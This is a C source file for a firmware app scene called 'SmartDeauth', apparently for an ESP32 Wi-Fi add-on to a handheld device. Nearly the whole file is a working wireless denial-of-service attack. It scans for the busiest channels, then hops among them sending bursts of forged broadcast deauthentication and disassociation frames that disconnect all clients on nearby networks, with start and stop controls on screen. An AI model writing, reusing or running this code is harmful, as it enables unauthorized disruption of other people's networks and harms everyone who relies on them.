#include "../wlan_app.h"
#include <wlan_hal.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#define TAG "SmartDeauth"
#define SD_CHANNEL_MIN 1
#define SD_CHANNEL_MAX 13
#define SD_TX_PERIOD_MS 5
#define SD_MAX_APS 8
#define SD_SCAN_INTERVAL_TICKS 8 // scan every 8 ticks (~2 s)

static const uint8_t sd_deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // RA = broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // TA = BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x02, 0x00,
};
static const uint8_t sd_deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08,
                                            0x0a, 0x0d, 0x0f, 0x12, 0x28};
static const uint8_t sd_broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

// Shared state between task and scene
static volatile TaskHandle_t sd_task = NULL;
static volatile bool sd_running = false;
static volatile uint32_t sd_frames = 0;
static volatile uint8_t sd_channel = 1;

// Channel activity tracking
static uint8_t sd_ch_ap_counts[SD_CHANNEL_MAX + 1];
static uint8_t sd_active_channels[3];
static uint8_t sd_active_count;

static void sd_tx_deauth(uint8_t channel) {
    uint8_t f[26];
    memcpy(f, sd_deauth_tmpl, 26);
    memcpy(&f[10], sd_broadcast, 6); // TA = broadcast
    memcpy(&f[16], sd_broadcast, 6); // BSSID = broadcast
    uint8_t reason = sd_deauth_reasons[sd_frames % sizeof(sd_deauth_reasons)];
    f[24] = reason;
    if(wlan_hal_raw_tx_retry(f, 26)) sd_frames++;
    f[0] = 0xa0; // Disassoc
    if(wlan_hal_raw_tx_retry(f, 26)) sd_frames++;
}

static void sd_task_fn(void* arg) {
    UNUSED(arg);
    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    wlan_hal_set_promiscuous(false, NULL);

    while(sd_running) {
        // Hop to next active channel
        if(sd_active_count > 0) {
            static uint8_t idx = 0;
            sd_channel = sd_active_channels[idx % sd_active_count];
            idx++;
            wlan_hal_set_channel(sd_channel);
        }

        // Burst deauth on current channel
        for(int i = 0; i < 20 && sd_running; ++i) {
            sd_tx_deauth(sd_channel);
            vTaskDelay(pdMS_TO_TICKS(SD_TX_PERIOD_MS));
        }
    }

    sd_task = NULL;
    vTaskDelete(NULL);
}

static void sd_scan_channels(void) {
    wlan_hal_set_promiscuous(false, NULL);

    memset(sd_ch_ap_counts, 0, sizeof(sd_ch_ap_counts));

    wifi_ap_record_t* recs = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&recs, &count, 64);

    for(uint16_t i = 0; i < count; ++i) {
        uint8_t ch = recs[i].primary;
        if(ch >= SD_CHANNEL_MIN && ch <= SD_CHANNEL_MAX) {
            sd_ch_ap_counts[ch]++;
        }
    }
    if(recs) free(recs);

    // Find top 3 most active channels
    sd_active_count = 0;
    for(int pass = 0; pass < 3; ++pass) {
        uint8_t best_ch = 0;
        uint8_t best_count = 0;
        for(uint8_t ch = SD_CHANNEL_MIN; ch <= SD_CHANNEL_MAX; ++ch) {
            if(sd_ch_ap_counts[ch] > best_count) {
                best_count = sd_ch_ap_counts[ch];
                best_ch = ch;
            }
        }
        if(best_ch > 0) {
            sd_active_channels[sd_active_count++] = best_ch;
            sd_ch_ap_counts[best_ch] = 0; // exclude from next pass
        }
    }

    ESP_LOGI(TAG, "scan: %u active channels found", (unsigned)sd_active_count);
}

static void sd_button_cb(GuiButtonType result, InputType type, void* context) {
    WlanApp* app = context;
    if(type == InputTypeShort &&
       (result == GuiButtonTypeLeft || result == GuiButtonTypeRight)) {
        view_dispatcher_send_custom_event(
            app->view_dispatcher, WlanAppCustomEventSmartDeauthToggle);
    }
}

static void sd_update_widget(WlanApp* app) {
    Widget* w = app->widget;
    widget_reset(w);

    char buf[128];
    snprintf(buf, sizeof(buf), "Status: %s", sd_running ? "RUNNING" : "Stopped");
    widget_add_string_element(w, 64, 8, AlignCenter, AlignTop, FontPrimary, buf);

    snprintf(buf, sizeof(buf), "Channel: %u", (unsigned)sd_channel);
    widget_add_string_element(w, 64, 22, AlignCenter, AlignTop, FontSecondary, buf);

    snprintf(buf, sizeof(buf), "Frames: %lu", (unsigned long)sd_frames);
    widget_add_string_element(w, 64, 34, AlignCenter, AlignTop, FontSecondary, buf);

    if(sd_active_count > 0) {
        char ch_list[32] = "";
        for(uint8_t i = 0; i < sd_active_count; ++i) {
            char tmp[8];
            snprintf(tmp, sizeof(tmp), "%s%u", i > 0 ? "," : "", (unsigned)sd_active_channels[i]);
            strlcat(ch_list, tmp, sizeof(ch_list));
        }
        snprintf(buf, sizeof(buf), "Active: %s", ch_list);
    } else {
        snprintf(buf, sizeof(buf), "Active: none");
    }
    widget_add_string_element(w, 64, 46, AlignCenter, AlignTop, FontSecondary, buf);

    widget_add_button_element(
        w, sd_running ? GuiButtonTypeLeft : GuiButtonTypeRight,
        sd_running ? "Stop" : "Start",
        sd_button_cb, app);
}

void wlan_app_scene_smart_deauth_on_enter(void* context) {
    WlanApp* app = context;
    sd_running = false;
    sd_frames = 0;
    sd_channel = 1;

    sd_scan_channels();

    if(sd_active_count > 0) {
        sd_channel = sd_active_channels[0];
    }

    sd_update_widget(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, WlanAppViewWidget);
}

bool wlan_app_scene_smart_deauth_on_event(void* context, SceneManagerEvent event) {
    WlanApp* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == WlanAppCustomEventSmartDeauthToggle) {
            if(!sd_running) {
                sd_running = true;
                xTaskCreatePinnedToCore(
                    sd_task_fn, "sd_deauth", 4096, NULL, 5, (TaskHandle_t*)&sd_task, 1);
            } else {
                sd_running = false;
                // Task will self-delete after loop exits
            }
            sd_update_widget(app);
            return true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        sd_update_widget(app);
        return true;
    }

    return false;
}

void wlan_app_scene_smart_deauth_on_exit(void* context) {
    UNUSED(context);
    sd_running = false;
    // Brief delay to let task notice sd_running=false
    vTaskDelay(pdMS_TO_TICKS(20));
    widget_reset(((WlanApp*)context)->widget);
}
